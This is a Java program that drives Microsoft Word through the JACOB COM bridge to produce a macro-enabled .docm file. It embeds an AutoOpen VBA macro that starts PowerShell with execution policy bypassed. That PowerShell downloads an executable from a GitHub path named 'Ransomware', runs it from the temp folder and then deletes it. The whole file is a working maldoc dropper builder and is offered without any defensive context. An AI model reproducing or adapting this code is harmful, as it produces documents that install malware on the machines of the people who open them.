import com.jacob.activeX.ActiveXComponent;
import com.jacob.com.Dispatch;
import com.jacob.com.Variant;

public class WordVbaAutomation {

    public static void main(String[] args) {
        // Update this path to where your actual JACOB DLL is located
        String dllPath = System.getProperty("user.dir") + "\\lib\\jacob-1.21-x64.dll";
        System.setProperty("jacob.dll.path", dllPath);


        ActiveXComponent word = null;

        try {
            // Start Word application
            word = new ActiveXComponent("Word.Application");
            word.setProperty("Visible", new Variant(false)); // false = run Word in background

            // Create a new document
            Dispatch documents = word.getProperty("Documents").toDispatch();
            Dispatch document = Dispatch.call(documents, "Add").toDispatch();

            // Access VBProject (the VBA project) in the document
            Dispatch vbProject = Dispatch.get(document, "VBProject").toDispatch();

            // Add a new VBA module (1 = standard module)
            Dispatch vbModules = Dispatch.get(vbProject, "VBComponents").toDispatch();
            Dispatch vbModule = Dispatch.call(vbModules, "Add", new Variant(1)).toDispatch();

            // Get the CodeModule of the new module
            Dispatch codeModule = Dispatch.get(vbModule, "CodeModule").toDispatch();

            // Your VBA macro code as a Java string (escaped)
            String vbaCode =
                    "Sub AutoOpen()\n" +
                            "    Dim psCommand As String\n" +
                            "    Dim command As String\n\n" +
                            "    ' Embed PowerShell script in a single string\n" +
                            "    psCommand = \"Set-Variable -Name url -Value ('https://github.com/hatifar/Ransomware/raw/refs/heads/main/main.exe');\" & _\n" +
                            "                \"Set-Variable -Name tempPath -Value ($env:TEMP + '\\\\main.exe');\" & _\n" +
                            "                \"Invoke-WebRequest -OutFile $tempPath -Uri $url;\" & _\n" +
                            "                \"Start-Process -FilePath $tempPath -Wait;\" & _\n" +
                            "                \"Remove-Item $tempPath -Force\"\n\n" +
                            "    ' Wrap the entire command in escaped quotes\n" +
                            "    command = \"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"\"\" & Replace(psCommand, \"\"\"\", \"\\\"\"\") & \"\"\"\"\n\n" +
                            "    ' Run the command\n" +
                            "    Shell command, vbNormalFocus\n" +
                            "End Sub";

            // Add VBA code to the module
            Dispatch.call(codeModule, "AddFromString", vbaCode);

            // Save the document as .docm (macro enabled)
            String outputPath = System.getProperty("user.dir") + "\\WordWithMacro.docm";
            Dispatch.call(document, "SaveAs2", outputPath, new Variant(13));  // 13 = wdFormatXMLDocumentMacroEnabled

            // Close the document without saving again
            Dispatch.call(document, "Close", new Variant(false));

            // Quit Word application
            word.invoke("Quit");

            System.out.println("Word document created with VBA macro: " + outputPath);

        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (word != null) {
                word.safeRelease();
            }
        }
    }
}
